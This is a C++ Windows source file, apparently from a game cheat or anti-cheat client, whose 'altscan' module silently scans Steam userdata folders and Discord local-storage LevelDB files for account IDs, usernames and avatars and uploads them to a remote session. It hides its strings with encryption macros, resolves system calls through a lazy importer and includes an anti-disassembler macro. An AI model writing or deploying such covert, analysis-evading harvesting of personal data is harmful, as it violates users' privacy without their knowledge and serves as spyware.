#include "altscan.hpp"
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include "../dbg.hpp"
#include "../session/session.hpp"
#include "pxstr.hpp"
#include "pxenc.hpp"
#include "lazy_importer.hpp"
#include "brkida.hpp"
#include "agent_stubs.hpp"

#define ALT_MAX_TOTAL 512
#define ALT_STARTUP_DELAY_MS 3000

static HANDLE g_Thread     = NULL;
static HANDLE g_StopEvent  = NULL;
static HANDLE g_ReadyEvent = NULL;

typedef struct _ALT_ITEM {
    BYTE Kind;
    char ExternalId[24];
    char Username[128];
    char Avatar[128];
} ALT_ITEM;

static ALT_ITEM  g_Items[ALT_MAX_TOTAL];
static ULONG     g_ItemCount = 0;

static
bool
AltAlreadyPresent(
    BYTE        kind,
    const char* extId
)
{
    for (ULONG i = 0; i < g_ItemCount; ++i) {
        if (g_Items[i].Kind == kind && strcmp(g_Items[i].ExternalId, extId) == 0)
            return true;
    }
    return false;
}

static
void
AltAdd(
    BYTE        kind,
    const char* extId,
    const char* username,
    const char* avatar
)
{
    if (!extId || !extId[0]) return;
    if (g_ItemCount >= ALT_MAX_TOTAL) return;
    if (AltAlreadyPresent(kind, extId)) return;
    ALT_ITEM* it = &g_Items[g_ItemCount++];
    it->Kind = kind;
    strncpy_s(it->ExternalId, extId, _TRUNCATE);
    if (username) strncpy_s(it->Username, username, _TRUNCATE); else it->Username[0] = 0;
    if (avatar)   strncpy_s(it->Avatar,   avatar,   _TRUNCATE); else it->Avatar[0]   = 0;
}

static
bool
QuerySteamInstallPath(
    wchar_t* Out,
    size_t   OutCap
)
{
    HKEY key = NULL;
    if (LI_ADVAPI(RegOpenKeyExW)(HKEY_CURRENT_USER, pxenc(L"Software\\Valve\\Steam"),
                                 0, KEY_READ, &key) == ERROR_SUCCESS) {
        DWORD type = 0, cb = (DWORD)(OutCap * sizeof(wchar_t));
        LONG r = LI_ADVAPI(RegQueryValueExW)(key, pxenc(L"SteamPath"), NULL, &type,
                                             (LPBYTE)Out, &cb);
        LI_ADVAPI(RegCloseKey)(key);
        if (r == ERROR_SUCCESS && type == REG_SZ && cb > 0) {
            Out[OutCap - 1] = 0;
            return true;
        }
    }

    if (LI_ADVAPI(RegOpenKeyExW)(HKEY_LOCAL_MACHINE, pxenc(L"SOFTWARE\\Wow6432Node\\Valve\\Steam"),
                                 0, KEY_READ | KEY_WOW64_32KEY, &key) == ERROR_SUCCESS) {
        DWORD type = 0, cb = (DWORD)(OutCap * sizeof(wchar_t));
        LONG r = LI_ADVAPI(RegQueryValueExW)(key, pxenc(L"InstallPath"), NULL, &type,
                                             (LPBYTE)Out, &cb);
        LI_ADVAPI(RegCloseKey)(key);
        if (r == ERROR_SUCCESS && type == REG_SZ && cb > 0) {
            Out[OutCap - 1] = 0;
            return true;
        }
    }

    _snwprintf_s(Out, OutCap, _TRUNCATE, pxenc(L"C:\\Program Files (x86)\\Steam"));
    return true;
}

static
void
ScanSteamUserdata(
)
{
    wchar_t steamPath[MAX_PATH] = { 0 };
    if (!QuerySteamInstallPath(steamPath, MAX_PATH)) return;

    wchar_t udRoot[MAX_PATH];
    _snwprintf_s(udRoot, _TRUNCATE, pxenc(L"%ls\\userdata"), steamPath);

    wchar_t pattern[MAX_PATH];
    _snwprintf_s(pattern, _TRUNCATE, pxenc(L"%ls\\*"), udRoot);

    WIN32_FIND_DATAW fd = { 0 };
    HANDLE h = LI_KERNEL(FindFirstFileW)(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == L'.') continue;

        UINT64 accId = 0;
        bool numeric = true;
        for (int i = 0; fd.cFileName[i]; ++i) {
            wchar_t c = fd.cFileName[i];
            if (c < L'0' || c > L'9') { numeric = false; break; }
            accId = accId * 10 + (UINT64)(c - L'0');
        }
        if (!numeric || accId == 0) continue;
        if (accId == 0 || accId == 1) continue;

        UINT64 sid64 = 76561197960265728ULL + accId;
        char idStr[24];
        _snprintf_s(idStr, _TRUNCATE, PX_A("%llu"), (unsigned long long)sid64);
        AltAdd(1, idStr, NULL, NULL);
    } while (LI_KERNEL(FindNextFileW)(h, &fd));

    LI_KERNEL(FindClose)(h);
}

static
BYTE*
ReadWholeFile(
    const wchar_t* Path,
    ULONG*         OutLen
)
{
    *OutLen = 0;
    HANDLE h = LI_KERNEL(CreateFileW)(Path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                      NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    LARGE_INTEGER sz = { 0 };
    if (!LI_KERNEL(GetFileSizeEx)(h, &sz) || sz.QuadPart <= 0 || sz.QuadPart > 64 * 1024 * 1024) {
        LI_KERNEL(CloseHandle)(h);
        return NULL;
    }
    ULONG size = (ULONG)sz.QuadPart;
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!buf) { LI_KERNEL(CloseHandle)(h); return NULL; }
    DWORD got = 0;
    if (!LI_KERNEL(ReadFile)(h, buf, size, &got, NULL) || got != size) {
        HeapFree(GetProcessHeap(), 0, buf);
        LI_KERNEL(CloseHandle)(h);
        return NULL;
    }
    LI_KERNEL(CloseHandle)(h);
    *OutLen = size;
    return buf;
}

static
bool
IsDigitStr(
    const char* s,
    ULONG       n
)
{
    if (n == 0) return false;
    for (ULONG i = 0; i < n; ++i) {
        if (s[i] < '0' || s[i] > '9') return false;
    }
    return true;
}

static
bool
FindQuotedFieldAscii(
    const BYTE* data,
    ULONG       len,
    ULONG       start,
    ULONG       end,
    const char* fieldPattern,
    ULONG       fieldPatLen,
    char*       Out,
    ULONG       OutCap
)
{
    for (ULONG i = start; i + fieldPatLen < end; ++i) {
        if (memcmp(data + i, fieldPattern, fieldPatLen) != 0) continue;
        ULONG p = i + fieldPatLen;
        if (p >= end || data[p] != '"') continue;
        ULONG q = p + 1;
        while (q < end && data[q] != '"') {
            if (data[q] == '\\' && q + 1 < end) q += 2;
            else q += 1;
        }
        if (q >= end) return false;
        ULONG vlen = q - (p + 1);
        if (vlen >= OutCap) vlen = OutCap - 1;
        memcpy(Out, data + p + 1, vlen);
        Out[vlen] = 0;
        return true;
    }
    return false;
}

static
bool
FindNullableFieldAscii(
    const BYTE* data,
    ULONG       len,
    ULONG       start,
    ULONG       end,
    const char* fieldPattern,
    ULONG       fieldPatLen,
    const char* nullTok,
    ULONG       nullTokLen,
    char*       Out,
    ULONG       OutCap
)
{
    for (ULONG i = start; i + fieldPatLen < end; ++i) {
        if (memcmp(data + i, fieldPattern, fieldPatLen) != 0) continue;
        ULONG p = i + fieldPatLen;
        if (p >= end) return false;
        if (data[p] == '"') {
            ULONG q = p + 1;
            while (q < end && data[q] != '"') {
                if (data[q] == '\\' && q + 1 < end) q += 2;
                else q += 1;
            }
            if (q >= end) return false;
            ULONG vlen = q - (p + 1);
            if (vlen >= OutCap) vlen = OutCap - 1;
            memcpy(Out, data + p + 1, vlen);
            Out[vlen] = 0;
            return true;
        }
        if (p + nullTokLen <= end && memcmp(data + p, nullTok, nullTokLen) == 0) {
            Out[0] = 0;
            return true;
        }
        return false;
    }
    return false;
}

static
void
ParseUsersArrayAscii(
    const BYTE* data,
    ULONG       len,
    ULONG       arrStart,
    ULONG*      addedOut
)
{
    auto patId     = PX_A("\"id\":");
    auto patUser   = PX_A("\"username\":");
    auto patAvatar = PX_A("\"avatar\":");
    auto patNull   = PX_A("null");
    const ULONG patIdLen     = 5;
    const ULONG patUserLen   = 11;
    const ULONG patAvatarLen = 9;
    const ULONG patNullLen   = 4;

    ULONG depth = 0;
    ULONG p = arrStart;
    while (p < len) {
        BYTE c = data[p];
        if (c == '[' || c == '{') depth++;
        else if (c == ']' || c == '}') {
            if (depth == 0) return;
            depth--;
            if (depth == 0 && c == ']') return;
        }
        if (c == '{') {
            ULONG objStart = p;
            ULONG innerDepth = 1;
            ULONG q = p + 1;
            while (q < len && innerDepth > 0) {
                BYTE cc = data[q];
                if (cc == '"') {
                    q++;
                    while (q < len && data[q] != '"') {
                        if (data[q] == '\\' && q + 1 < len) q += 2;
                        else q += 1;
                    }
                    if (q < len) q++;
                    continue;
                }
                if (cc == '{') innerDepth++;
                else if (cc == '}') innerDepth--;
                q++;
            }
            if (innerDepth != 0) return;
            ULONG objEnd = q;

            char id[32]        = { 0 };
            char username[128] = { 0 };
            char avatar[128]   = { 0 };
            bool gotId  = FindQuotedFieldAscii(data, len, objStart, objEnd,
                                               patId, patIdLen, id, sizeof(id));
            bool gotUsr = FindQuotedFieldAscii(data, len, objStart, objEnd,
                                               patUser, patUserLen, username, sizeof(username));
            bool gotAvatar = FindNullableFieldAscii(data, len, objStart, objEnd,
                                               patAvatar, patAvatarLen,
                                               patNull, patNullLen,
                                               avatar, sizeof(avatar));
            (void)gotAvatar;

            ULONG idLen = (ULONG)strlen(id);
            if (gotId && gotUsr && idLen >= 17 && idLen <= 20 && IsDigitStr(id, idLen)) {
                if (!AltAlreadyPresent(2, id)) {
                    AltAdd(2, id, username, avatar);
                    (*addedOut)++;
                }
            }

            p = objEnd + 1;
            depth = 1;
            continue;
        }
        p++;
    }
}

static
void
ScanFileForDiscordUsers(
    const wchar_t* Path
)
{
    ULONG size = 0;
    BYTE* buf = ReadWholeFile(Path, &size);
    if (!buf) return;

    auto needle = PX_A("\"users\":[");
    const ULONG nLen   = 9;

    ULONG added = 0;
    for (ULONG i = 0; i + nLen < size; ++i) {
        if (memcmp(buf + i, needle, nLen) != 0) continue;
        ULONG arrStart = i + nLen - 1;
        ParseUsersArrayAscii(buf, size, arrStart, &added);
        i = arrStart;
    }
    HeapFree(GetProcessHeap(), 0, buf);
}

static
void
ScanDiscordFolder(
    const wchar_t* AppdataRoot,
    const wchar_t* Variant
)
{
    wchar_t leveldbDir[MAX_PATH];
    _snwprintf_s(leveldbDir, _TRUNCATE, pxenc(L"%ls\\%ls\\Local Storage\\leveldb"),
                 AppdataRoot, Variant);

    wchar_t pattern[MAX_PATH];
    _snwprintf_s(pattern, _TRUNCATE, pxenc(L"%ls\\*"), leveldbDir);

    WIN32_FIND_DATAW fd = { 0 };
    HANDLE h = LI_KERNEL(FindFirstFileW)(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        const wchar_t* name = fd.cFileName;
        size_t n = wcslen(name);
        bool isLdb = (n > 4 && _wcsicmp(name + n - 4, pxenc(L".ldb")) == 0);
        bool isLog = (n > 4 && _wcsicmp(name + n - 4, pxenc(L".log")) == 0);
        if (!isLdb && !isLog) continue;

        wchar_t full[MAX_PATH];
        _snwprintf_s(full, _TRUNCATE, pxenc(L"%ls\\%ls"), leveldbDir, name);
        ScanFileForDiscordUsers(full);
    } while (LI_KERNEL(FindNextFileW)(h, &fd));
    LI_KERNEL(FindClose)(h);
}

static
void
ScanDiscordAlts(
)
{
    wchar_t appdata[MAX_PATH] = { 0 };
    if (LI_SHELL32(SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) return;

    ScanDiscordFolder(appdata, pxenc(L"discord"));
    ScanDiscordFolder(appdata, pxenc(L"discordptb"));
    ScanDiscordFolder(appdata, pxenc(L"discordcanary"));
}

static
DWORD
WINAPI
AltScanThread(
    LPVOID
)
{
    BRKIDA;
    HANDLE waits[2] = { g_ReadyEvent, g_StopEvent };
    DWORD gate = LI_KERNEL(WaitForMultipleObjects)(2, waits, FALSE, INFINITE);
    if (gate != WAIT_OBJECT_0) return 0;
    LI_KERNEL(Sleep)(ALT_STARTUP_DELAY_MS);
    if (LI_KERNEL(WaitForSingleObject)(g_StopEvent, 0) == WAIT_OBJECT_0) return 0;
    if (SessionIsAllowlisted()) return 0;

    g_ItemCount = 0;
    ScanSteamUserdata();
    ScanDiscordAlts();
    if (g_ItemCount == 0) return 0;

    KG_ALT_ENTRY* wire = (KG_ALT_ENTRY*)HeapAlloc(GetProcessHeap(), 0, sizeof(KG_ALT_ENTRY) * g_ItemCount);
    if (!wire) return 0;
    for (ULONG i = 0; i < g_ItemCount; ++i) {
        wire[i].Kind       = g_Items[i].Kind;
        wire[i].ExternalId = g_Items[i].ExternalId;
        wire[i].Username   = g_Items[i].Username;
        wire[i].Avatar     = g_Items[i].Avatar;
    }
    (void)SessionSendAltAccounts(wire, g_ItemCount);
    HeapFree(GetProcessHeap(), 0, wire);
    return 0;
}

bool
AltScanStart(
    HANDLE ReadyEvent
)
{
    if (!ReadyEvent) return false;
    if (g_Thread) return true;
    g_ReadyEvent = ReadyEvent;
    g_StopEvent  = LI_KERNEL(CreateEventW)(NULL, TRUE, FALSE, NULL);
    if (!g_StopEvent) return false;
    g_Thread = LI_KERNEL(CreateThread)(NULL, 0, AltScanThread, NULL, 0, NULL);
    return g_Thread != NULL;
}

void
AltScanStop(
)
{
    if (g_StopEvent) LI_KERNEL(SetEvent)(g_StopEvent);
    if (g_Thread) {
        LI_KERNEL(WaitForSingleObject)(g_Thread, 5000);
        LI_KERNEL(CloseHandle)(g_Thread);
        g_Thread = NULL;
    }
    if (g_StopEvent) {
        LI_KERNEL(CloseHandle)(g_StopEvent);
        g_StopEvent = NULL;
    }
    g_ReadyEvent = NULL;
}
